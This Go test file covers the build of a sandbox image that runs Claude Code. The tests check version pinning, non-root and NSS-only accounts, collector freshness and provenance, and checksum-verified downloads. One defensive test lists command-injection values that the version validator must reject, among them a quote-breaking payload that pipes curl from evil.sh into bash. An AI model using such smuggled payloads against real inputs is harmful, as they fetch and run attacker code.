package image

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Build silently owns correctness properties that nothing else checks: the pinned Claude Code
// version, the non-root agent user, and the Files map keys matching what PostPushLayers later
// chmods. A typo in either half breaks the golden image with a failure that surfaces much later,
// inside a paid sandbox.

func stubRepo(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	for _, rel := range []string{beaconRelPath, collectorRelPath} {
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("#!/bin/true\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func TestBuildPinsClaudeVersion(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t)}, nil)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(spec.Layers, "\n")

	if !strings.Contains(joined, "bash -s "+DefaultClaudeVersion) {
		t.Errorf("the installer must pin a version, or runs are not reproducible:\n%s", joined)
	}
	// An explicit version must win over the default.
	spec, err = Build(Spec{RepoRoot: stubRepo(t), ClaudeVersion: "9.9.9"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(strings.Join(spec.Layers, "\n"), "bash -s 9.9.9") {
		t.Error("explicit ClaudeVersion was not honoured")
	}
}

// Claude Code refuses --dangerously-skip-permissions as root, so the image must create and use
// an unprivileged account or every tool-using scenario fails.
func TestBuildCreatesNonRootAgentUser(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t)}, nil)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(spec.Layers, "\n")

	// Matched on the command and the account rather than the exact flag string: the assertion is
	// that an unprivileged account gets created, not the order its options happen to appear in.
	if !strings.Contains(joined, "useradd") || !strings.Contains(joined, AgentUser) {
		t.Errorf("image must create the %s user:\n%s", AgentUser, joined)
	}
	if !strings.Contains(joined, "su - "+AgentUser+" -c 'curl -fsSL https://claude.ai/install.sh") {
		t.Errorf("Claude Code must be installed as %s, not root:\n%s", AgentUser, joined)
	}
	if AgentUser == "root" {
		t.Fatal("AgentUser must not be root")
	}
}

// The NSS-only lane exists to reproduce a directory-backed fleet, where an account resolves
// through getent but is absent from /etc/passwd. If the image ever creates that account with
// useradd anyway, the lane silently becomes an ordinary one and the scenario built on it reports
// that a bug is fixed when it was never exercised.
func TestBuildNSSOnlyUserDoesNotWriteEtcPasswd(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t), NSSOnlyUser: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(spec.Layers, "\n")

	if strings.Contains(joined, "useradd") {
		t.Errorf("the NSS-only lane must not create a local account:\n%s", joined)
	}
	if !strings.Contains(joined, "libnss-extrausers") {
		t.Errorf("the NSS-only lane needs an NSS module to resolve through:\n%s", joined)
	}
	if !strings.Contains(joined, "/var/lib/extrausers/passwd") {
		t.Errorf("the account must live in the NSS database:\n%s", joined)
	}
	if !strings.Contains(joined, "extrausers") || !strings.Contains(joined, "/etc/nsswitch.conf") {
		t.Errorf("nsswitch must route passwd lookups through the NSS module:\n%s", joined)
	}
	// The image asserts its own property at build time; losing that check would let a broken NSS
	// module produce a lane that looks right and tests nothing.
	if !strings.Contains(joined, "getent passwd "+AgentUser) {
		t.Errorf("the image must verify getent resolves %s:\n%s", AgentUser, joined)
	}
	if !strings.Contains(joined, "/etc/passwd") {
		t.Errorf("the image must verify %s did not leak into /etc/passwd:\n%s", AgentUser, joined)
	}
}

// Both lanes must produce the same account identity, so a scenario comparing them is comparing
// visibility and nothing else.
func TestBothAccountLanesAgreeOnIdentity(t *testing.T) {
	local := strings.Join(accountLayers(false), "\n")
	nss := strings.Join(accountLayers(true), "\n")

	for _, want := range []string{AgentUser, AgentHome, fmt.Sprint(AgentUID)} {
		if !strings.Contains(local, want) {
			t.Errorf("local lane missing %q:\n%s", want, local)
		}
		if !strings.Contains(nss, want) {
			t.Errorf("NSS lane missing %q:\n%s", want, nss)
		}
	}
}

// PostPushLayers chmods and symlinks exactly the paths Build declares. If the two drift, the
// binaries land somewhere nothing makes executable.
func TestFilesMatchPostPushLayers(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t)}, nil)
	if err != nil {
		t.Fatal(err)
	}
	post := PostPushLayers()
	if len(spec.Files) == 0 {
		t.Fatal("expected artifact files in the spec")
	}
	for remote := range spec.Files {
		if !strings.Contains(post, remote) {
			t.Errorf("Files declares %q but PostPushLayers never chmods it:\n%s", remote, post)
		}
	}
	for _, want := range []string{BeaconDir + "/beacon", BeaconDir + "/beacon-otelcol"} {
		if _, ok := spec.Files[want]; !ok {
			t.Errorf("expected %q among the staged files, got %v", want, keys(spec.Files))
		}
	}
}

// PATH must reach both binaries, or the session cannot find claude or beacon.
func TestPathPrependReachesBothBinaries(t *testing.T) {
	path := PathPrepend()
	joined := strings.Join(path, ":")
	if !strings.Contains(joined, AgentHome+"/.local/bin") {
		t.Errorf("PATH must include the agent's local bin (where the Claude installer lands): %v", path)
	}
	if !strings.Contains(joined, BeaconDir) {
		t.Errorf("PATH must include %s: %v", BeaconDir, path)
	}
}

// The error a first-time user is most likely to see must name the fix.
func TestArtifactsErrorNamesTheBuildCommand(t *testing.T) {
	root := t.TempDir()
	_, err := Artifacts(root, nil)
	if err == nil {
		t.Fatal("expected an error when the beacon binary is absent")
	}
	if !strings.Contains(err.Error(), BuildBeaconHint) {
		t.Errorf("error should tell the user how to build it, got: %v", err)
	}
	// Slash-normalized for the same reason as the guarded-path assertion: the error embeds a
	// filepath.Join'd path, so it renders with the host separator while beaconRelPath is written
	// with forward slashes.
	if !strings.Contains(filepath.ToSlash(err.Error()), beaconRelPath) {
		t.Errorf("error should name the missing path, got: %v", err)
	}
}

func TestArtifactsSucceedsWhenBothPresent(t *testing.T) {
	root := stubRepo(t)
	a, err := Artifacts(root, nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if a.Beacon != BeaconPath(root) || a.Collector != CollectorPath(root) {
		t.Errorf("unexpected artifact paths: %+v", a)
	}
}

// A zero-byte file is what an interrupted build leaves behind. Treating it as present would
// surface as a confusing exec failure inside a paid sandbox instead of failing here.
func TestArtifactsRejectsEmptyBeaconBinary(t *testing.T) {
	root := stubRepo(t)
	if err := os.WriteFile(BeaconPath(root), nil, 0o755); err != nil {
		t.Fatal(err)
	}
	_, err := Artifacts(root, nil)
	if err == nil {
		t.Fatal("an empty beacon binary must be rejected")
	}
	if !strings.Contains(err.Error(), "empty") {
		t.Errorf("error should say the build did not complete, got: %v", err)
	}
	if !strings.Contains(err.Error(), BuildBeaconHint) {
		t.Errorf("error should name the rebuild command, got: %v", err)
	}
}

func TestCollectorIsStaleIgnoresACleanTree(t *testing.T) {
	// A directory that is not a git repo must not report staleness, or every non-git checkout
	// gets a spurious warning.
	stale, _ := CollectorIsStale(t.TempDir())
	if stale {
		t.Error("a non-git directory should not report exporter changes")
	}
}

func keys(m map[string]string) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// The freshness check exists to prevent verifying the wrong binary. Its first version only looked
// at uncommitted git status, so a committed exporter change or a binary downloaded from an older
// release both read as fresh -- the exact false pass it claims to guard, and one that already cost
// a wasted investigation once. Cursor Bugbot flagged the gap. These pin the two added signals.

func gitRepo(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	for _, args := range [][]string{
		{"init", "-q"},
		{"config", "user.email", "t@example.com"},
		{"config", "user.name", "t"},
	} {
		cmd := exec.Command("git", append([]string{"-C", root}, args...)...)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Skipf("git unavailable: %v: %s", err, out)
		}
	}
	if err := os.MkdirAll(filepath.Join(root, "collector-builder", "exporter"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(CollectorPath(root)), 0o755); err != nil {
		t.Fatal(err)
	}
	return root
}

// commitAll makes the tree clean, so a test can isolate a freshness signal other than
// "uncommitted changes" -- which correctly fires first and would otherwise mask the rest.
func commitAll(t *testing.T, root, msg string) {
	t.Helper()
	for _, args := range [][]string{{"add", "-A"}, {"commit", "-qm", msg}} {
		if out, err := exec.Command("git", append([]string{"-C", root}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v: %s", args, err, out)
		}
	}
}

func writeFile(t *testing.T, path, body string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// A binary downloaded from a release must be reported stale once collector-builder/ has changed
// since that release, even though every change is committed and the tree is clean.
func TestDownloadedCollectorIsStaleAfterCommittedExporterChanges(t *testing.T) {
	root := gitRepo(t)
	src := filepath.Join(root, "collector-builder", "exporter", "exp.go")
	writeFile(t, src, "package exp\n")
	run := func(args ...string) {
		t.Helper()
		if out, err := exec.Command("git", append([]string{"-C", root}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v: %s", args, err, out)
		}
	}
	run("add", "-A")
	run("commit", "-qm", "base")
	run("tag", "v1.0.6")

	// The collector came from that release, recorded exactly as EnsureCollector would.
	writeFile(t, CollectorPath(root), "binary")
	if err := writeProvenance(root, "v1.0.6"); err != nil {
		t.Fatal(err)
	}

	// Clean tree at the release: nothing to warn about.
	if stale, why := CollectorIsStale(root); stale {
		t.Fatalf("at the release commit nothing has changed, got stale: %s", why)
	}

	// Now commit an exporter change. Tree is still clean, so the old check saw nothing.
	writeFile(t, src, "package exp\n// changed\n")
	run("add", "-A")
	run("commit", "-qm", "change the exporter")

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("a committed exporter change after the downloaded release must be reported stale")
	}
	if !strings.Contains(why, "v1.0.6") || !strings.Contains(why, "exp.go") {
		t.Errorf("the reason should name the release and the changed file, got %q", why)
	}
}

// A locally built binary older than its sources is stale even with a clean tree and no provenance.
func TestLocallyBuiltCollectorOlderThanSourcesIsStale(t *testing.T) {
	root := gitRepo(t)
	writeFile(t, filepath.Join(root, "collector-builder", "exporter", "exp.go"), "package exp\n")
	commitAll(t, root, "sources") // clean tree, so only the mtime signal is under test
	writeFile(t, CollectorPath(root), "binary")
	// Backdate the binary so the source is unambiguously newer.
	old := time.Now().Add(-2 * time.Hour)
	if err := os.Chtimes(CollectorPath(root), old, old); err != nil {
		t.Fatal(err)
	}

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("a binary older than its sources must be reported stale")
	}
	if !strings.Contains(why, "exp.go") {
		t.Errorf("the reason should name the newer source, got %q", why)
	}
}

// A freshly built binary must not warn, or the check becomes noise everyone learns to ignore.
func TestFreshLocalBuildIsNotStale(t *testing.T) {
	root := gitRepo(t)
	writeFile(t, filepath.Join(root, "collector-builder", "exporter", "exp.go"), "package exp\n")
	commitAll(t, root, "sources") // clean tree, so only the mtime signal is under test
	// Built after the source.
	writeFile(t, CollectorPath(root), "binary")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	if stale, why := CollectorIsStale(root); stale {
		t.Errorf("a binary newer than its sources is fresh, got stale: %s", why)
	}
}

// The whole point of the freshness warning is that doing what it asks clears it. A first version
// of provenance recorded only the release tag, and nothing cleared that marker on a local rebuild
// -- so CollectorIsStale kept reporting "downloaded from release X" forever and the warning could
// never be satisfied. A warning that cannot be cleared trains people to ignore it, which is worse
// than the false pass it replaced. Cursor Bugbot caught it.
func TestRebuildingLocallyClearsTheDownloadedProvenance(t *testing.T) {
	root := gitRepo(t)
	src := filepath.Join(root, "collector-builder", "exporter", "exp.go")
	writeFile(t, src, "package exp\n")
	commitAll(t, root, "base")
	if out, err := exec.Command("git", "-C", root, "tag", "v1.0.6").CombinedOutput(); err != nil {
		t.Fatalf("tag: %v: %s", err, out)
	}

	// A downloaded binary, with provenance recorded exactly as EnsureCollector would.
	writeFile(t, CollectorPath(root), "downloaded-binary")
	if err := writeProvenance(root, "v1.0.6"); err != nil {
		t.Fatal(err)
	}

	// Commit an exporter change: the downloaded binary is now genuinely stale.
	writeFile(t, src, "package exp\n// changed\n")
	commitAll(t, root, "change the exporter")

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("a downloaded binary predating a committed exporter change must be stale")
	}
	if !strings.Contains(why, "v1.0.6") {
		t.Errorf("expected the release-based reason, got %q", why)
	}

	// Now do exactly what the warning asks: rebuild locally. The marker is not touched, which is
	// the situation that made the warning permanent.
	writeFile(t, CollectorPath(root), "freshly-built-binary-with-different-size")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	stale, why = CollectorIsStale(root)
	if stale {
		t.Errorf("a local rebuild must clear the warning, got stale: %s", why)
	}
}

// The marker must still be trusted while it genuinely describes the binary, or the release signal
// would never fire at all.
func TestProvenanceIsTrustedWhileItMatchesTheBinary(t *testing.T) {
	root := gitRepo(t)
	writeFile(t, filepath.Join(root, "collector-builder", "exporter", "exp.go"), "package exp\n")
	commitAll(t, root, "base")
	if out, err := exec.Command("git", "-C", root, "tag", "v1.0.6").CombinedOutput(); err != nil {
		t.Fatalf("tag: %v: %s", err, out)
	}
	writeFile(t, CollectorPath(root), "downloaded-binary")
	if err := writeProvenance(root, "v1.0.6"); err != nil {
		t.Fatal(err)
	}
	if got, state := recordedRelease(root); got != "v1.0.6" || state != provenanceTrusted {
		t.Errorf("an untouched binary must keep its provenance, got %q state=%v", got, state)
	}

	// Replace the binary: the marker no longer describes it.
	writeFile(t, CollectorPath(root), "something-else-entirely")
	if _, state := recordedRelease(root); state == provenanceTrusted {
		t.Error("a replaced binary must not keep a trusted marker")
	}
}

// A marker from before identity was recorded cannot be validated, so it must not be trusted.
func TestLegacyProvenanceWithoutIdentityIsNotTrusted(t *testing.T) {
	root := gitRepo(t)
	writeFile(t, CollectorPath(root), "binary")
	writeFile(t, provenancePath(root), "release:v1.0.5\n")

	if _, state := recordedRelease(root); state == provenanceTrusted {
		t.Error("an unverifiable marker must not be trusted")
	}
}

// The version reaches a shell inside the image layer via single-quoted interpolation, so a value
// containing a quote would break the quoting and change what gets executed. A whitelist is used
// rather than an escaping scheme because rejecting an unexpected shape is easier to reason about
// than proving escaping is airtight. Reported by the Copilot reviewer.
func TestClaudeVersionRejectsAnythingButDottedNumerals(t *testing.T) {
	bad := []string{
		`2.1.220'; curl evil.sh | bash; echo '`, // the actual injection
		`2.1.220'`, `'`, `2.1.220 && whoami`, `$(id)`, "2.1.220\nRUN echo hi",
		`v2.1.220`, `latest`, `2..1`, `.2.1`, `2.1.`, ``,
	}
	for _, v := range bad {
		if _, err := Build(Spec{RepoRoot: t.TempDir(), ClaudeVersion: v}, nil); err == nil {
			t.Errorf("version %q must be rejected", v)
		} else if v != "" && !strings.Contains(err.Error(), "claude-version") {
			// An empty value legitimately falls back to the default and then fails on artifacts.
			t.Errorf("version %q should fail on validation, got: %v", v, err)
		}
	}
}

// Real versions must keep working, or pinning becomes impossible.
func TestClaudeVersionAcceptsRealVersions(t *testing.T) {
	root := t.TempDir()
	// Build fails later on missing artifacts; only the validation gate is under test here.
	for _, v := range []string{"2.1.220", "2.1.0", "10.20.30", "3"} {
		_, err := Build(Spec{RepoRoot: root, ClaudeVersion: v}, nil)
		if err != nil && strings.Contains(err.Error(), "claude-version") {
			t.Errorf("version %q should be accepted, got: %v", v, err)
		}
	}
}

// The collector binary is executed inside the sandbox, so accepting whatever the network returned
// would make a compromised proxy or mirror enough to run arbitrary code. Verification against the
// release's own checksums.txt is therefore mandatory, and a release without one must be refused
// rather than trusted. Reported by the Copilot reviewer.
func TestChecksumParsingSelectsTheRightEntry(t *testing.T) {
	body := "aaaa1111  beacon_1.0.6_darwin_arm64.tar.gz\n" +
		"bbbb2222  beacon_1.0.6_linux_amd64.tar.gz\n" +
		"cccc3333  threat-rules.tar.gz\n"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(body))
	}))
	defer srv.Close()

	got, err := expectedSHA256(srv.Client(), srv.URL, "beacon_1.0.6_linux_amd64.tar.gz")
	if err != nil {
		t.Fatal(err)
	}
	if got != "bbbb2222" {
		t.Errorf("digest = %q, want the linux_amd64 entry", got)
	}

	// A tarball with no entry cannot be verified, so it must error rather than pass.
	if _, err := expectedSHA256(srv.Client(), srv.URL, "beacon_1.0.6_linux_arm64.tar.gz"); err == nil {
		t.Error("a missing checksums entry must be an error, not an empty digest")
	}
}

// A mismatched digest must refuse to install the binary at all.
func TestDownloadRefusesAMismatchedChecksum(t *testing.T) {
	payload := []byte("this is not really a tarball")
	mux := http.NewServeMux()
	mux.HandleFunc("/tarball", func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write(payload) })
	mux.HandleFunc("/checksums.txt", func(w http.ResponseWriter, r *http.Request) {
		// A digest that deliberately does not match the payload.
		_, _ = w.Write([]byte("0000000000000000000000000000000000000000000000000000000000000000  t.tar.gz\n"))
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	dst := filepath.Join(t.TempDir(), "dist", "beacon-otelcol")
	err := downloadCollector(releaseAsset{
		Version: "v1.0.6", Name: "t.tar.gz",
		URL: srv.URL + "/tarball", ChecksumsURL: srv.URL + "/checksums.txt",
	}, dst, func(string, ...any) {})

	if err == nil {
		t.Fatal("a mismatched checksum must refuse the download")
	}
	if !strings.Contains(err.Error(), "checksum mismatch") {
		t.Errorf("the error should name the mismatch, got: %v", err)
	}
	if _, statErr := os.Stat(dst); statErr == nil {
		t.Error("nothing must be installed when verification fails")
	}
}

// An unresolvable release tag must not read as "no drift". doctor --fix can record a tag the local
// clone does not have yet -- no `git fetch --tags`, or a release newer than the checkout -- and the
// old code turned that into a confident *fresh*, skipping the mtime fallback entirely. With exporter
// changes present, collector_freshness reported green and a run verified the wrong beacon-otelcol:
// exactly the false pass this check exists to prevent. Cursor Bugbot reported it as High.
func TestUnresolvableReleaseTagIsNotReportedFresh(t *testing.T) {
	root := gitRepo(t)
	writeFile(t, filepath.Join(root, "collector-builder", "exporter", "exp.go"), "package exp\n")
	commitAll(t, root, "base")

	writeFile(t, CollectorPath(root), "downloaded-binary")
	// Provenance names a release this clone has never seen.
	if err := writeProvenance(root, "v99.99.99"); err != nil {
		t.Fatal(err)
	}

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("an unresolvable tag means drift is unknowable and must not report fresh")
	}
	for _, want := range []string{"v99.99.99", "cannot resolve"} {
		if !strings.Contains(why, want) {
			t.Errorf("the reason should explain the unresolvable tag, got %q", why)
		}
	}
	// And it must point at something the reader can actually do.
	if !strings.Contains(why, "fetch --tags") && !strings.Contains(why, "rebuild") {
		t.Errorf("the reason should suggest a remedy, got %q", why)
	}
}

// A resolvable tag with no drift must still report fresh, or every downloaded collector warns
// forever and the check becomes noise.
func TestResolvableTagWithNoDriftStaysFresh(t *testing.T) {
	root := gitRepo(t)
	writeFile(t, filepath.Join(root, "collector-builder", "exporter", "exp.go"), "package exp\n")
	commitAll(t, root, "base")
	if out, err := exec.Command("git", "-C", root, "tag", "v1.0.6").CombinedOutput(); err != nil {
		t.Fatalf("tag: %v: %s", err, out)
	}
	writeFile(t, CollectorPath(root), "downloaded-binary")
	if err := writeProvenance(root, "v1.0.6"); err != nil {
		t.Fatal(err)
	}

	if stale, why := CollectorIsStale(root); stale {
		t.Errorf("a resolvable tag at HEAD has no drift, got stale: %s", why)
	}
}

// The false green Bugbot reported: a downloaded release binary whose provenance is absent or no
// longer describes it. CollectorIsStale then skipped release-drift detection and fell back to
// comparing mtimes -- and a downloaded binary is essentially always newer than local sources, so
// committed exporter changes since that release went unreported and the check went green while the
// run verified the wrong beacon-otelcol.
func TestUnprovenancedBinaryWithExporterDriftIsNotFresh(t *testing.T) {
	root := gitRepo(t)
	src := filepath.Join(root, "collector-builder", "exporter", "exp.go")
	writeFile(t, src, "package exp\n")
	commitAll(t, root, "base")
	if out, err := exec.Command("git", "-C", root, "tag", "v1.0.6").CombinedOutput(); err != nil {
		t.Fatalf("tag: %v: %s", err, out)
	}
	// Exporter changes land after that release.
	writeFile(t, src, "package exp\n// the change under test\n")
	commitAll(t, root, "change the exporter")

	// A binary with no provenance at all, newer than the sources -- which is what a download
	// looks like, and also what a local build looks like. Origin is genuinely unknown.
	writeFile(t, CollectorPath(root), "binary-of-unknown-origin")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("exporter drift since the last release plus an unknown origin cannot be called fresh")
	}
	for _, want := range []string{"v1.0.6", "origin is unrecorded", "exp.go"} {
		if !strings.Contains(why, want) {
			t.Errorf("the reason should name the release, the gap, and the file; got %q", why)
		}
	}
}

// The narrowing that keeps this off the common path: no exporter changes since the last release
// means an unprovenanced binary cannot be carrying stale exporter code, so no warning.
func TestUnprovenancedBinaryWithNoDriftStaysQuiet(t *testing.T) {
	root := gitRepo(t)
	writeFile(t, filepath.Join(root, "collector-builder", "exporter", "exp.go"), "package exp\n")
	commitAll(t, root, "base")
	if out, err := exec.Command("git", "-C", root, "tag", "v1.0.6").CombinedOutput(); err != nil {
		t.Fatalf("tag: %v: %s", err, out)
	}
	writeFile(t, CollectorPath(root), "binary-of-unknown-origin")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	if stale, why := CollectorIsStale(root); stale {
		t.Errorf("no exporter drift since the release means nothing to warn about, got: %s", why)
	}
}

// A provenance marker whose identity no longer matches is the documented local rebuild, so the
// mtime comparison governs and a rebuilt-from-current-sources binary is fresh.
func TestStaleProvenanceFallsBackToTheMtimeComparison(t *testing.T) {
	root := gitRepo(t)
	src := filepath.Join(root, "collector-builder", "exporter", "exp.go")
	writeFile(t, src, "package exp\n")
	commitAll(t, root, "base")
	if out, err := exec.Command("git", "-C", root, "tag", "v1.0.6").CombinedOutput(); err != nil {
		t.Fatalf("tag: %v: %s", err, out)
	}
	writeFile(t, src, "package exp\n// changed\n")
	commitAll(t, root, "change the exporter")

	writeFile(t, CollectorPath(root), "downloaded")
	if err := writeProvenance(root, "v1.0.6"); err != nil {
		t.Fatal(err)
	}
	// The documented rebuild replaces the binary, invalidating the marker's identity.
	writeFile(t, CollectorPath(root), "rebuilt-locally-with-a-different-size")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	if stale, why := CollectorIsStale(root); stale {
		t.Errorf("a local rebuild from current sources is fresh, got: %s", why)
	}
}
